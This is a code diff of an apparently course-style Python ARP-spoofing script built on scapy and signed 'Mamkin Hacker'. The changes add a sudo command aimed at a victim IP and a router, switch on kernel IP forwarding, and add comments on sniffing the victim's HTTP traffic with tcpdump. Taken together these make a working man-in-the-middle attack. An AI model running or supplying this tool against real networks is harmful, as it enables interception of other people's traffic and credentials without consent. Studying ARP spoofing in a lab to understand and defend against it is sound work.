@@ -1,11 +1,12 @@
-#! python3
 """
 arpspoofer @Mamkin Hacker
+run: sudo python3 ./l11-arpspoof.py -v "192.168.1.242" -r "192.168.1.1"
 """
 import scapy.all as scapy
 import argparse
 from scapy.layers.l2 import Ether, ARP
 import time
+import subprocess
 
 
 def args():
@@ -36,7 +37,8 @@ def spoof(victim, router):
         print(f"can't find mac for ip {router}, exit...")
         exit(0)
 
-    packet_to_victim = ARP(pdst=victim, op=2, hwdst=victim_mac, psrc=router)  # mac = of attaker
+    packet_to_victim = ARP(
+        pdst=victim, op=2, hwdst=victim_mac, psrc=router)  # mac = of attaker
     packet_to_router = ARP(pdst=router, op=2, hwdst=router_mac, psrc=victim)
     counter = 0
     while True:
@@ -49,4 +51,13 @@ def spoof(victim, router):
 
 if __name__ == '__main__':
     options = args()
+    # Enabling ip_forward
+    subprocess.call(["sysctl", "-w", "net.ipv4.ip_forward=1"])
+    ipfwd_state = subprocess.run(
+        ["cat", "/proc/sys/net/ipv4/ip_forward"], stdout=subprocess.PIPE)
+    print(f"ip_forwarding= {ipfwd_state.stdout.decode()}")
+    # Start spoofing
     spoof(options.victim, options.router)
+    # Run 'sudo tcpdump -vv -i any port 80' on this host
+    # Now open browser on victim host, open http site
+    # And your see spoofed packets
